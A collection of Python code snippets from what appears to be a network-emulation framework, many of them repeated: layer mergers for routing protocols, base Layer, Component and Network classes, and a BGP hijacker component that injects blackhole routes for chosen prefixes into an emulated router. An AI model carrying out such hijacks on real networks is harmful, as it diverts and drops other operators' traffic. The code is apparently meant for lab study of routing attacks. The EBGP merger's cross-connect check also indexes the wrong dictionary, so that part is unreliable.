  "def doMerge(self, objectA: Mpls, objectB: Mpls) -> Mpls:\n        \"\"\"!\n        @brief merge two Mpls layers.\n\n        @param objectA first Mpls layer.\n        @param objectB second Mpls layer.\n        \n        @returns merged Mpls layer.\n        \"\"\"\n        new_mpls = Mpls()\n\n        for (asn, nodename) in (objectA.getEdges() | objectB.getEdges()):\n            new_mpls.markAsEdge(asn, nodename)\n\n        for asn in (objectA.getEnabled() | objectB.getEnabled()):\n            new_mpls.enableOn(asn)\n\n        return new_mpls",
  "class DefaultOspfMerger(Merger):\n    \"\"\"!\n    @brief default OSPF layer merging implementation.\n    \"\"\"\n\n    def getName(self) -> str:\n        return 'DefaultOspfMerger'\n\n    def getTargetType(self) -> str:\n        return 'OspfLayer'\n\n    def doMerge(self, objectA: Ospf, objectB: Ospf) -> Ospf:\n        \"\"\"!\n        @brief merge two Ospf layers.\n\n        @param objectA first Ospf layer.\n        @param objectB second Ospf layer.\n        \n        @returns merged Ospf layer.\n        \"\"\"\n        \n        new_ospf = Ospf()\n\n        for (asn, netname) in (objectA.getStubs() | objectB.getStubs()):\n            new_ospf.markAsStub(asn, netname)\n\n        for (asn, netname) in (objectA.getMaskedNetworks() | objectB.getMaskedNetworks()):\n            new_ospf.maskNetwork(asn, netname)\n\n        for asn in (objectA.getMaskedAsns() | objectB.getMaskedAsns()):\n            new_ospf.maskAsn(asn)\n\n        return new_ospf",
  "def getName(self) -> str:\n        return 'DefaultOspfMerger'",
  "def getTargetType(self) -> str:\n        return 'OspfLayer'",
  "def doMerge(self, objectA: Ospf, objectB: Ospf) -> Ospf:\n        \"\"\"!\n        @brief merge two Ospf layers.\n\n        @param objectA first Ospf layer.\n        @param objectB second Ospf layer.\n        \n        @returns merged Ospf layer.\n        \"\"\"\n        \n        new_ospf = Ospf()\n\n        for (asn, netname) in (objectA.getStubs() | objectB.getStubs()):\n            new_ospf.markAsStub(asn, netname)\n\n        for (asn, netname) in (objectA.getMaskedNetworks() | objectB.getMaskedNetworks()):\n            new_ospf.maskNetwork(asn, netname)\n\n        for asn in (objectA.getMaskedAsns() | objectB.getMaskedAsns()):\n            new_ospf.maskAsn(asn)\n\n        return new_ospf",
  "class DefaultBaseMerger(Merger):\n    \"\"\"!\n    @brief default implementation of base layer merger.\n    \"\"\"\n\n    __asConflictHandler: Callable[[AutonomousSystem, AutonomousSystem], AutonomousSystem]\n    __ixConflictHandler: Callable[[InternetExchange, InternetExchange], InternetExchange]\n\n    def __init__(\n        self,\n        onAsConflict: Callable[[AutonomousSystem, AutonomousSystem], AutonomousSystem] = lambda asA, asB: asA,\n        onIxConflict: Callable[[InternetExchange, InternetExchange], InternetExchange] = lambda ixA, ixB: ixA):\n        \"\"\"!\n        @brief DefaultBaseMerger constructor.\n        @param onAsConflict AS conflict handler. This will be called when the\n        same AS appears in both emulations. This parameter should be a function,\n        two AS objects will be passed in, and a new AS object should be\n        returned. This defaults to returning the AS object in the first\n        emulation.\n        @param onIxConflict IX conflict handler. This will be called when the\n        same IX appears in both emulations. This parameter should be a function,\n        two IX objects will be passed in, and a new IX object should be\n        returned. This defaults to returning the IX object in the first\n        emulation.\n        \"\"\"\n        super().__init__()\n        self.__asConflictHandler = onAsConflict\n        self.__ixConflictHandler = onIxConflict\n\n    def getName(self) -> str:\n        return 'DefaultBaseMerger'\n\n    def getTargetType(self) -> str:\n        return 'BaseLayer'\n\n    def doMerge(self, objectA: Base, objectB: Base) -> Base:\n        \"\"\"!\n        @brief merge two base layers.\n\n        @param objectA first base.\n        @param objectB second base.\n\n        @returns merged base.\n        \"\"\"\n        \n        as_objects: Dict[int, AutonomousSystem] = {}\n        ix_objects: Dict[int, InternetExchange] = {}\n\n        for asn in objectA.getAsns():\n            self._log('found AS{} in the first emulator.'.format(asn))\n            as_objects[asn] = objectA.getAutonomousSystem(asn)\n\n        for ix in objectA.getInternetExchangeIds():\n            self._log('found IX{} in the first emulator.'.format(ix))\n            ix_objects[ix] = objectA.getInternetExchange(ix)\n\n        for asn in objectB.getAsns():\n            self._log('found AS{} in the second emulator.'.format(asn))\n            obj = objectB.getAutonomousSystem(asn)\n            if asn in as_objects.keys():\n                self._log('AS{} is also in the first emulator, calling conflict handler.'.format(asn))\n                obj = self.__asConflictHandler(as_objects[asn], obj)\n                if obj != as_objects[asn]: as_objects[asn] = obj\n            else: as_objects[asn] = obj\n        \n        for ix in objectB.getInternetExchangeIds():\n            self._log('found IX{} in the second emulator.'.format(ix))\n            obj = objectB.getInternetExchange(ix)\n            if ix in ix_objects.keys():\n                self._log('IX{} is also in the first emulator, calling conflict handler.'.format(ix))\n                obj = self.__ixConflictHandler(ix_objects[ix], obj)\n                if obj != ix_objects[ix]: ix_objects[ix] = obj\n            else: ix_objects[ix] = obj\n\n        new_base = Base()\n\n        for ix_object in ix_objects.values(): new_base.setInternetExchange(ix_object)\n        for as_object in as_objects.values(): new_base.setAutonomousSystem(as_object)\n\n        return new_base",
  "def __init__(\n        self,\n        onAsConflict: Callable[[AutonomousSystem, AutonomousSystem], AutonomousSystem] = lambda asA, asB: asA,\n        onIxConflict: Callable[[InternetExchange, InternetExchange], InternetExchange] = lambda ixA, ixB: ixA):\n        \"\"\"!\n        @brief DefaultBaseMerger constructor.\n        @param onAsConflict AS conflict handler. This will be called when the\n        same AS appears in both emulations. This parameter should be a function,\n        two AS objects will be passed in, and a new AS object should be\n        returned. This defaults to returning the AS object in the first\n        emulation.\n        @param onIxConflict IX conflict handler. This will be called when the\n        same IX appears in both emulations. This parameter should be a function,\n        two IX objects will be passed in, and a new IX object should be\n        returned. This defaults to returning the IX object in the first\n        emulation.\n        \"\"\"\n        super().__init__()\n        self.__asConflictHandler = onAsConflict\n        self.__ixConflictHandler = onIxConflict",
  "def getName(self) -> str:\n        return 'DefaultBaseMerger'",
  "def getTargetType(self) -> str:\n        return 'BaseLayer'",
  "def doMerge(self, objectA: Base, objectB: Base) -> Base:\n        \"\"\"!\n        @brief merge two base layers.\n\n        @param objectA first base.\n        @param objectB second base.\n\n        @returns merged base.\n        \"\"\"\n        \n        as_objects: Dict[int, AutonomousSystem] = {}\n        ix_objects: Dict[int, InternetExchange] = {}\n\n        for asn in objectA.getAsns():\n            self._log('found AS{} in the first emulator.'.format(asn))\n            as_objects[asn] = objectA.getAutonomousSystem(asn)\n\n        for ix in objectA.getInternetExchangeIds():\n            self._log('found IX{} in the first emulator.'.format(ix))\n            ix_objects[ix] = objectA.getInternetExchange(ix)\n\n        for asn in objectB.getAsns():\n            self._log('found AS{} in the second emulator.'.format(asn))\n            obj = objectB.getAutonomousSystem(asn)\n            if asn in as_objects.keys():\n                self._log('AS{} is also in the first emulator, calling conflict handler.'.format(asn))\n                obj = self.__asConflictHandler(as_objects[asn], obj)\n                if obj != as_objects[asn]: as_objects[asn] = obj\n            else: as_objects[asn] = obj\n        \n        for ix in objectB.getInternetExchangeIds():\n            self._log('found IX{} in the second emulator.'.format(ix))\n            obj = objectB.getInternetExchange(ix)\n            if ix in ix_objects.keys():\n                self._log('IX{} is also in the first emulator, calling conflict handler.'.format(ix))\n                obj = self.__ixConflictHandler(ix_objects[ix], obj)\n                if obj != ix_objects[ix]: ix_objects[ix] = obj\n            else: ix_objects[ix] = obj\n\n        new_base = Base()\n\n        for ix_object in ix_objects.values(): new_base.setInternetExchange(ix_object)\n        for as_object in as_objects.values(): new_base.setAutonomousSystem(as_object)\n\n        return new_base",
  "class DefaultRoutingMerger(Merger):\n    \"\"\"!\n    @brief default routing layer merger implementation.\n\n    This merger merges direct network lists.\n    \"\"\"\n\n    def getName(self) -> str:\n        return 'DefaultRoutingMerger'\n\n    def getTargetType(self) -> str:\n        return 'RoutingLayer'\n\n    def doMerge(self, objectA: Routing, objectB: Routing) -> Routing:\n        \"\"\"!\n        @brief merge two Routing layers.\n\n        @param objectA first Routing layer.\n        @param objectB second Routing layer.\n        \n        @returns merged Routing layer.\n        \"\"\"\n        new_routing = Routing()\n\n        return new_routing",
  "def getName(self) -> str:\n        return 'DefaultRoutingMerger'",
  "def getTargetType(self) -> str:\n        return 'RoutingLayer'",
  "def doMerge(self, objectA: Routing, objectB: Routing) -> Routing:\n        \"\"\"!\n        @brief merge two Routing layers.\n\n        @param objectA first Routing layer.\n        @param objectB second Routing layer.\n        \n        @returns merged Routing layer.\n        \"\"\"\n        new_routing = Routing()\n\n        return new_routing",
  "class DefaultIbgpMerger(Merger):\n    \"\"\"!\n    @brief default IBGP layer merging implementation.\n    \"\"\"\n\n    def getName(self) -> str:\n        return 'DefaultIbgpMerger'\n\n    def getTargetType(self) -> str:\n        return 'IbgpLayer'\n\n    def doMerge(self, objectA: Ibgp, objectB: Ibgp) -> Ibgp:\n        \"\"\"!\n        @brief merge two Ibgp layers.\n\n        @param objectA first Ibgp layer.\n        @param objectB second Ibgp layer.\n        \n        @returns merged Ibgp layer.\n        \"\"\"\n        new_ibgp = Ibgp()\n        for asn in (objectA.getMaskedAsns() | objectB.getMaskedAsns()):\n            new_ibgp.maskAsn(asn)\n\n        return new_ibgp",
  "def getName(self) -> str:\n        return 'DefaultIbgpMerger'",
  "def getTargetType(self) -> str:\n        return 'IbgpLayer'",
  "def doMerge(self, objectA: Ibgp, objectB: Ibgp) -> Ibgp:\n        \"\"\"!\n        @brief merge two Ibgp layers.\n\n        @param objectA first Ibgp layer.\n        @param objectB second Ibgp layer.\n        \n        @returns merged Ibgp layer.\n        \"\"\"\n        new_ibgp = Ibgp()\n        for asn in (objectA.getMaskedAsns() | objectB.getMaskedAsns()):\n            new_ibgp.maskAsn(asn)\n\n        return new_ibgp",
  "class DefaultEbgpMerger(Merger):\n    \"\"\"!\n    @brief default EBGP layer merging implementation.\n    \"\"\"\n\n    __peeringConflictHandler: Callable[[int, int, int, PeerRelationship, PeerRelationship], PeerRelationship]\n    __xcPeeringConflictHandler: Callable[[int, int, int, PeerRelationship, PeerRelationship], PeerRelationship]\n\n    def __init__(\n        self,\n        onPeeringRelationshipConflict: Callable[[int, int, int, PeerRelationship, PeerRelationship], PeerRelationship] = lambda ix, a, b, relA, relB: relA,\n        onXcPeeringRelationshipConflict: Callable[[int, int, PeerRelationship, PeerRelationship], PeerRelationship] = lambda a, b, relA, relB: relA):\n        \"\"\"!\n        @brief DefaultEbgpMerger constructor.\n        @param onPeeringRelationshipConflict define handler for handling peering\n        relationship conflicts. This should be a function that accepts: (ix,\n        asnA, asnB, peeringRelationshipA, peeringRelationshipB) and return a\n        peering relationship. This defaults to use the peering relationship\n        set in the first emulator.\n        @param onXcPeeringRelationshipConflict define handler for handling\n        peering relationship conflicts. This should be a function that accepts:\n        (asnA, asnB, peeringRelationshipA, peeringRelationshipB) and return a\n        peering relationship. This defaults to use the peering relationship\n        set in the first emulator.\n        \"\"\"\n        super().__init__()\n        self.__peeringConflictHandler = onPeeringRelationshipConflict\n        self.__xcPeeringConflictHandler = onXcPeeringRelationshipConflict\n        \n    def getName(self) -> str:\n        return 'DefaultEbgpMerger'\n\n    def getTargetType(self) -> str:\n        return 'EbgpLayer'\n\n    def doMerge(self, objectA: Ebgp, objectB: Ebgp) -> Ebgp:\n        \"\"\"!\n        @brief merge two Ebgp layers.\n\n        @param objectA first Ebgp layer.\n        @param objectB second Ebgp layer.\n        \n        @returns merged Ebgp layer.\n        \"\"\"\n        \n        new_private = objectA.getPrivatePeerings()\n        new_rs = objectA.getRsPeers()\n        new_xc = objectA.getCrossConnectPeerings()\n\n        for ((ix, a, b), rel) in objectB.getPrivatePeerings().items():\n            if (ix, a, b) in new_private.keys() and new_private[(ix, a, b)] != rel:\n                self._log('Peering relationship conflict for peering in IX{} between AS{} and AS{}: {} != {}, calling handler'.format(\n                    ix, a, b, new_private[(ix, a, b)], rel\n                ))\n                new_private[(ix, a, b)] = self.__peeringConflictHandler(ix, a, b, new_private[(ix, a, b)], rel)\n            else: new_private[(ix, a, b)] = rel\n        \n        for (ix, asn) in objectB.getRsPeers():\n            if (ix, asn) not in new_rs: new_rs.append((ix, asn))\n\n        for ((a, b), rel) in objectB.getCrossConnectPeerings().items():\n            if (a, b) in new_xc.keys() and new_private[(a, b)] != rel:\n                self._log('Peering relationship conflict for peering in XC between AS{} and AS{}: {} != {}, calling handler'.format(\n                    a, b, new_xc[(a, b)], rel\n                ))\n                new_xc[(a, b)] = self.__xcPeeringConflictHandler(a, b, new_xc[(a, b)], rel)\n            else: new_xc[(a, b)] = rel\n\n        new_ebgp = Ebgp()\n\n        for ((ix, a, b), rel) in new_private.items(): new_ebgp.addPrivatePeering(ix, a, b, rel)\n        for ((a, b), rel) in new_xc.items(): new_ebgp.addCrossConnectPeering(a, b, rel)\n        for (ix, asn) in new_rs: new_ebgp.addRsPeer(ix, asn)\n\n        return new_ebgp",
  "def __init__(\n        self,\n        onPeeringRelationshipConflict: Callable[[int, int, int, PeerRelationship, PeerRelationship], PeerRelationship] = lambda ix, a, b, relA, relB: relA,\n        onXcPeeringRelationshipConflict: Callable[[int, int, PeerRelationship, PeerRelationship], PeerRelationship] = lambda a, b, relA, relB: relA):\n        \"\"\"!\n        @brief DefaultEbgpMerger constructor.\n        @param onPeeringRelationshipConflict define handler for handling peering\n        relationship conflicts. This should be a function that accepts: (ix,\n        asnA, asnB, peeringRelationshipA, peeringRelationshipB) and return a\n        peering relationship. This defaults to use the peering relationship\n        set in the first emulator.\n        @param onXcPeeringRelationshipConflict define handler for handling\n        peering relationship conflicts. This should be a function that accepts:\n        (asnA, asnB, peeringRelationshipA, peeringRelationshipB) and return a\n        peering relationship. This defaults to use the peering relationship\n        set in the first emulator.\n        \"\"\"\n        super().__init__()\n        self.__peeringConflictHandler = onPeeringRelationshipConflict\n        self.__xcPeeringConflictHandler = onXcPeeringRelationshipConflict",
  "def getName(self) -> str:\n        return 'DefaultEbgpMerger'",
  "def getTargetType(self) -> str:\n        return 'EbgpLayer'",
  "def doMerge(self, objectA: Ebgp, objectB: Ebgp) -> Ebgp:\n        \"\"\"!\n        @brief merge two Ebgp layers.\n\n        @param objectA first Ebgp layer.\n        @param objectB second Ebgp layer.\n        \n        @returns merged Ebgp layer.\n        \"\"\"\n        \n        new_private = objectA.getPrivatePeerings()\n        new_rs = objectA.getRsPeers()\n        new_xc = objectA.getCrossConnectPeerings()\n\n        for ((ix, a, b), rel) in objectB.getPrivatePeerings().items():\n            if (ix, a, b) in new_private.keys() and new_private[(ix, a, b)] != rel:\n                self._log('Peering relationship conflict for peering in IX{} between AS{} and AS{}: {} != {}, calling handler'.format(\n                    ix, a, b, new_private[(ix, a, b)], rel\n                ))\n                new_private[(ix, a, b)] = self.__peeringConflictHandler(ix, a, b, new_private[(ix, a, b)], rel)\n            else: new_private[(ix, a, b)] = rel\n        \n        for (ix, asn) in objectB.getRsPeers():\n            if (ix, asn) not in new_rs: new_rs.append((ix, asn))\n\n        for ((a, b), rel) in objectB.getCrossConnectPeerings().items():\n            if (a, b) in new_xc.keys() and new_private[(a, b)] != rel:\n                self._log('Peering relationship conflict for peering in XC between AS{} and AS{}: {} != {}, calling handler'.format(\n                    a, b, new_xc[(a, b)], rel\n                ))\n                new_xc[(a, b)] = self.__xcPeeringConflictHandler(a, b, new_xc[(a, b)], rel)\n            else: new_xc[(a, b)] = rel\n\n        new_ebgp = Ebgp()\n\n        for ((ix, a, b), rel) in new_private.items(): new_ebgp.addPrivatePeering(ix, a, b, rel)\n        for ((a, b), rel) in new_xc.items(): new_ebgp.addCrossConnectPeering(a, b, rel)\n        for (ix, asn) in new_rs: new_ebgp.addRsPeer(ix, asn)\n\n        return new_ebgp",
  "class BgpAttackerInjectorHook(Hook):\n    \"\"\"!\n    @brief Hook to inject static protocol after the EBGP layer configured the\n    router. (we need the t_bgp table.)\n    \"\"\"\n    \n    __component: BgpAttackerComponent\n\n    def __init__(self, component: 'BgpAttackerComponent'):\n        \"\"\"!\n        @brief create the hook.\n\n        @param component the attacker component.\n        \"\"\"\n        self.__component = component\n\n    def getName(self) -> str:\n        return 'BgpAttackerInjectorAs{}'.format(self.__component.getHijackerAsn())\n\n    def getTargetLayer(self) -> str:\n        return 'Ebgp'\n\n    def postrender(self, emulator: Emulator):\n        prefixes = self.__component.getHijackedPrefixes()\n        self._log('hijacking prefixes: {}'.format(prefixes))\n        \n        router = self.__component.getHijackerRouter()\n        router.addTable('t_hijack')\n        router.addTablePipe('t_hijack', 't_bgp', exportFilter = 'filter { bgp_large_community.add(LOCAL_COMM); bgp_local_pref = 40; accept; }')\n\n        if len(prefixes) > 0:\n            routes = ''\n            for prefix in prefixes:\n                routes += '    route {} blackhole;\\n'.format(prefix)\n\n            router.addProtocol('static', 'hijacks', BgpAttackerComponentTemplates['hijack_static'].format(\n                routes = routes\n            ))",
  "class BgpAttackerComponent(Component):\n    \"\"\"!\n    @brief BGP hijacker component.\n    \"\"\"\n\n    __data: Emulator\n    __hijacker_as: AutonomousSystem\n    __prefixes: List[str]\n    __routing: Routing\n    __hijacker: Router\n\n    def __init__(self, attackerAsn: int):\n        \"\"\"!\n        @brief Create a new BGP hijacker.\n\n        @param attackerAsn ASN of the hijacker.\n        \"\"\"\n\n        self.__data = Emulator()\n        self.__prefixes = []\n\n        base = Base()\n        self.__routing = Routing()\n\n        self.__hijacker_as = base.createAutonomousSystem(attackerAsn)\n        self.__hijacker = self.__hijacker_as.createRouter('hijacker')\n\n        self.__data.addLayer(base)\n        self.__data.addLayer(self.__routing)\n        self.__data.addHook(BgpAttackerInjectorHook(self))\n\n    def getHijackerAsn(self) -> int: \n        \"\"\"!\n        @brief Get ASN of the hijacker.\n\n        @returns ASN.\n        \"\"\"\n        return self.__hijacker_as.getAsn()\n\n    def getHijackerRouter(self) -> Router:\n        \"\"\"!\n        @brief Get the router object of the hijacker.\n\n        @returns router.\n        \"\"\"\n        return self.__hijacker\n\n    def get(self) -> Emulator:\n        \"\"\"!\n        @brief Get the emulator with attacker.\n\n        Merge the emulator to install the component.\n        \"\"\"\n        return self.__data\n\n    def addHijackedPrefix(self, prefix: str) -> BgpAttackerComponent:\n        \"\"\"!\n        @brief Add a prefix to hijack.\n\n        @param prefix prefix in CIDR notation.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__prefixes.append(prefix)\n\n        return self\n\n    def getHijackedPrefixes(self) -> List[str]:\n        \"\"\"!\n        @brief Get hijacked prefixes.\n\n        @returns list of prefixes.\n        \"\"\"\n        return self.__prefixes\n\n    def joinInternetExchange(self, ix: str, addr: str) -> BgpAttackerComponent:\n        \"\"\"!\n        @brief Join an internet exchange.\n\n        @param ix internet exchange network name.\n        @param addr address in the exchange.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__hijacker.joinNetwork(ix, addr)\n\n        return self",
  "def __init__(self, component: 'BgpAttackerComponent'):\n        \"\"\"!\n        @brief create the hook.\n\n        @param component the attacker component.\n        \"\"\"\n        self.__component = component",
  "def getName(self) -> str:\n        return 'BgpAttackerInjectorAs{}'.format(self.__component.getHijackerAsn())",
  "def getTargetLayer(self) -> str:\n        return 'Ebgp'",
  "def postrender(self, emulator: Emulator):\n        prefixes = self.__component.getHijackedPrefixes()\n        self._log('hijacking prefixes: {}'.format(prefixes))\n        \n        router = self.__component.getHijackerRouter()\n        router.addTable('t_hijack')\n        router.addTablePipe('t_hijack', 't_bgp', exportFilter = 'filter { bgp_large_community.add(LOCAL_COMM); bgp_local_pref = 40; accept; }')\n\n        if len(prefixes) > 0:\n            routes = ''\n            for prefix in prefixes:\n                routes += '    route {} blackhole;\\n'.format(prefix)\n\n            router.addProtocol('static', 'hijacks', BgpAttackerComponentTemplates['hijack_static'].format(\n                routes = routes\n            ))",
  "def __init__(self, attackerAsn: int):\n        \"\"\"!\n        @brief Create a new BGP hijacker.\n\n        @param attackerAsn ASN of the hijacker.\n        \"\"\"\n\n        self.__data = Emulator()\n        self.__prefixes = []\n\n        base = Base()\n        self.__routing = Routing()\n\n        self.__hijacker_as = base.createAutonomousSystem(attackerAsn)\n        self.__hijacker = self.__hijacker_as.createRouter('hijacker')\n\n        self.__data.addLayer(base)\n        self.__data.addLayer(self.__routing)\n        self.__data.addHook(BgpAttackerInjectorHook(self))",
  "def getHijackerAsn(self) -> int: \n        \"\"\"!\n        @brief Get ASN of the hijacker.\n\n        @returns ASN.\n        \"\"\"\n        return self.__hijacker_as.getAsn()",
  "def getHijackerRouter(self) -> Router:\n        \"\"\"!\n        @brief Get the router object of the hijacker.\n\n        @returns router.\n        \"\"\"\n        return self.__hijacker",
  "def get(self) -> Emulator:\n        \"\"\"!\n        @brief Get the emulator with attacker.\n\n        Merge the emulator to install the component.\n        \"\"\"\n        return self.__data",
  "def addHijackedPrefix(self, prefix: str) -> BgpAttackerComponent:\n        \"\"\"!\n        @brief Add a prefix to hijack.\n\n        @param prefix prefix in CIDR notation.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__prefixes.append(prefix)\n\n        return self",
  "def getHijackedPrefixes(self) -> List[str]:\n        \"\"\"!\n        @brief Get hijacked prefixes.\n\n        @returns list of prefixes.\n        \"\"\"\n        return self.__prefixes",
  "def joinInternetExchange(self, ix: str, addr: str) -> BgpAttackerComponent:\n        \"\"\"!\n        @brief Join an internet exchange.\n\n        @param ix internet exchange network name.\n        @param addr address in the exchange.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__hijacker.joinNetwork(ix, addr)\n\n        return self",
  "class Layer(Printable, Registrable, Configurable, Mergeable):\n    \"\"\"!\n    @brief The layer interface.\n    \"\"\"\n\n    __dependencies: Dict[str, Set[Tuple[str, bool]]]\n\n    def __init__(self):\n        \"\"\"!\n        @brief create a new layer.\n        \"\"\"\n\n        super().__init__()\n        self.__dependencies = {}\n\n    def getTypeName(self) -> str:\n        \"\"\"!\n        @brief get typename of this layer.\n\n        @returns type name.\n        \"\"\"\n        return '{}Layer'.format(self.getName())\n\n    def shouldMerge(self, other: Layer) -> bool:\n        \"\"\"!\n        @brief test if this layer should be merged with another layer.\n\n        @param other the other layer.\n\n        @returns true if yes; will be true if the layer is the same layer.\n        \"\"\"\n\n        return self.getName() == other.getName()\n\n    def addDependency(self, layerName: str, reverse: bool, optional: bool):\n        \"\"\"!\n        @brief add layer dependency.\n\n        @param layerName name of the layer.\n        @param reverse add as reverse dependency. Regular dependency requires\n        the given layer to be rendered before the current layer. Reverse\n        dependency requires the given layer to be rendered after the current\n        layer. \n        @param optional continue render even if the given layer does not exist.\n        Does not work for reverse dependencies.\n        \"\"\"\n\n        _current = layerName if reverse else self.getName()\n        _target = self.getName() if reverse else layerName\n\n        if _current not in self.__dependencies:\n            self.__dependencies[_current] = set()\n\n        self.__dependencies[_current].add((_target, optional))\n\n    def getDependencies(self) -> Dict[str, Set[Tuple[str, bool]]]:\n        \"\"\"!\n        @brief Get dependencies.\n\n        @return dependencies.\n        \"\"\"\n\n        return self.__dependencies\n\n    def getName(self) -> str:\n        \"\"\"!\n        @brief Get name of this layer.\n\n        This method should return a unique name for this layer. This will be\n        used by the renderer to resolve dependencies relationships.\n\n        @returns name of the layer.\n        \"\"\"\n        raise NotImplementedError('getName not implemented')\n\n    def render(self, emulator: Emulator) -> None:\n        \"\"\"!\n        @brief Handle rendering.\n        \"\"\"\n        raise NotImplementedError('render not implemented')\n\n    def _log(self, message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n        \"\"\"\n        print(\"==== {}Layer: {}\".format(self.getName(), message), file=stderr)",
  "def __init__(self):\n        \"\"\"!\n        @brief create a new layer.\n        \"\"\"\n\n        super().__init__()\n        self.__dependencies = {}",
  "def getTypeName(self) -> str:\n        \"\"\"!\n        @brief get typename of this layer.\n\n        @returns type name.\n        \"\"\"\n        return '{}Layer'.format(self.getName())",
  "def shouldMerge(self, other: Layer) -> bool:\n        \"\"\"!\n        @brief test if this layer should be merged with another layer.\n\n        @param other the other layer.\n\n        @returns true if yes; will be true if the layer is the same layer.\n        \"\"\"\n\n        return self.getName() == other.getName()",
  "def addDependency(self, layerName: str, reverse: bool, optional: bool):\n        \"\"\"!\n        @brief add layer dependency.\n\n        @param layerName name of the layer.\n        @param reverse add as reverse dependency. Regular dependency requires\n        the given layer to be rendered before the current layer. Reverse\n        dependency requires the given layer to be rendered after the current\n        layer. \n        @param optional continue render even if the given layer does not exist.\n        Does not work for reverse dependencies.\n        \"\"\"\n\n        _current = layerName if reverse else self.getName()\n        _target = self.getName() if reverse else layerName\n\n        if _current not in self.__dependencies:\n            self.__dependencies[_current] = set()\n\n        self.__dependencies[_current].add((_target, optional))",
  "def getDependencies(self) -> Dict[str, Set[Tuple[str, bool]]]:\n        \"\"\"!\n        @brief Get dependencies.\n\n        @return dependencies.\n        \"\"\"\n\n        return self.__dependencies",
  "def getName(self) -> str:\n        \"\"\"!\n        @brief Get name of this layer.\n\n        This method should return a unique name for this layer. This will be\n        used by the renderer to resolve dependencies relationships.\n\n        @returns name of the layer.\n        \"\"\"\n        raise NotImplementedError('getName not implemented')",
  "def render(self, emulator: Emulator) -> None:\n        \"\"\"!\n        @brief Handle rendering.\n        \"\"\"\n        raise NotImplementedError('render not implemented')",
  "def _log(self, message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n        \"\"\"\n        print(\"==== {}Layer: {}\".format(self.getName(), message), file=stderr)",
  "class Component(object):\n    \"\"\"!\n    @brief Component interface.\n    \"\"\"\n\n    def __init__(self) -> None:\n        super().__init__()\n\n    def get(self) -> Emulator:\n        \"\"\"!\n        @brief get the emulator with component.\n        \"\"\"\n        raise NotImplementedError('get not iImplemented.')\n\n    def getVirtualNodes(self) -> List[str]:\n        \"\"\"!\n        @brief get list of virtual nodes.\n        \"\"\"\n        return []",
  "def __init__(self) -> None:\n        super().__init__()",
  "def get(self) -> Emulator:\n        \"\"\"!\n        @brief get the emulator with component.\n        \"\"\"\n        raise NotImplementedError('get not iImplemented.')",
  "def getVirtualNodes(self) -> List[str]:\n        \"\"\"!\n        @brief get list of virtual nodes.\n        \"\"\"\n        return []",
  "class Network(Printable, Registrable, Vertex):\n    \"\"\"!\n    @brief The network class.\n\n    This class represents a network.\n    \"\"\"\n    __type: NetworkType\n    __prefix: IPv4Network\n    __name: str\n    __scope: str\n    __aac: AddressAssignmentConstraint\n    __assigners: Dict[NodeRole, Assigner]\n\n    __connected_nodes: List['Node']\n\n    __d_latency: int       # in ms\n    __d_bandwidth: int     # in bps\n    __d_drop: float        # percentage\n\n    __mtu: int\n\n    __direct: bool\n\n    __rap: RemoteAccessProvider\n\n    def __init__(self, name: str, type: NetworkType, prefix: IPv4Network, aac: AddressAssignmentConstraint = None, direct: bool = False):\n        \"\"\"!\n        @brief Network constructor.\n\n        @param name name of the network. Note that this is considered a \"local\"\n        name. Networks can have the same name, as long as they are in different\n        contexts (i.e., different AS).\n        @param type type of the network.\n        @param prefix prefix of the network.\n        @param aac (optional) AddressAssignmentConstraint to use.\n        @param direct (optional) mark network as direct. A direct network will be\n        loaded to RIB by routing layer. Default to False.\n        \"\"\"\n        super().__init__()\n\n        self.__name = name\n        self.__type = type\n        self.__prefix = prefix\n        self.__aac = aac if aac != None else AddressAssignmentConstraint()\n        self.__assigners = {}\n\n        self.__connected_nodes = []\n\n        self.__assigners[NodeRole.Router] = self.__aac.getOffsetAssigner(NodeRole.Router)\n        self.__assigners[NodeRole.Host] = self.__aac.getOffsetAssigner(NodeRole.Host)\n\n        self.__d_latency = 0\n        self.__d_bandwidth = 0\n        self.__d_drop = 0\n\n        self.__mtu = 1500\n\n        self.__direct = direct\n\n        self.__rap = None\n\n    def isDirect(self) -> bool:\n        \"\"\"!\n        @brief test if this network is direct network. A direct network will be\n        added to RIB of routing daemons.\n\n        @returns true if direct, false otherwise.\n        \"\"\"\n\n        return self.__direct\n\n    def setDirect(self, direct: bool) -> Network:\n        \"\"\"!\n        @brief set if this network is direct network. A direct network will be\n        added to RIB of routing daemons.\n\n        @param direct bool, true to set the network as direct, false otherwise.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        self.__direct = direct\n\n        return self\n\n    def setMtu(self, mtu: int) -> Network:\n        \"\"\"!\n        @brief Set MTU of this network.\n\n        @param mtu MTU.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__mtu = mtu\n\n        return self\n\n    def getMtu(self) -> int:\n        \"\"\"!\n        @brief Get MTU of this network.\n\n        @returns mtu.\n        \"\"\"\n        return self.__mtu\n\n    def setDefaultLinkProperties(self, latency: int = 0, bandwidth: int = 0, packetDrop: float = 0) -> Network:\n        \"\"\"!\n        @brief Set default link properties of interfaces attached to the network.\n\n        @param latency (optional) latency to add to the link in ms, default 0. Note that this will be\n        apply on all interfaces, meaning the rtt between two hosts will be 2 * latency.\n        @param bandwidth (optional) egress bandwidth of the link in bps, 0 for unlimited, default 0.\n        @param packetDrop (optional) link packet drop as percentage, 0 for unlimited, default 0.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert latency >= 0, 'invalid latency'\n        assert bandwidth >= 0, 'invalid bandwidth'\n        assert packetDrop >= 0 and packetDrop <= 100, 'invalid packet drop'\n\n        self.__d_latency = latency\n        self.__d_bandwidth = bandwidth\n        self.__d_drop = packetDrop\n\n        return self\n\n    def setType(self, newType: NetworkType) -> Network:\n        \"\"\"!\n        @brief overrides network type of this network. Do not use this unless\n        you know what you are doing.\n\n        @param newType new net type.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__type = newType\n\n        return self\n\n    def getDefaultLinkProperties(self) -> Tuple[int, int, int]:\n        \"\"\"!\n        @brief Get default link properties.\n\n        @returns tuple (latency, bandwidth, packet drop)\n        \"\"\"\n        return (self.__d_latency, self.__d_bandwidth, self.__d_drop)\n\n    def getName(self) -> str:\n        \"\"\"!\n        @brief Get name of this network.\n\n        @returns name.\n        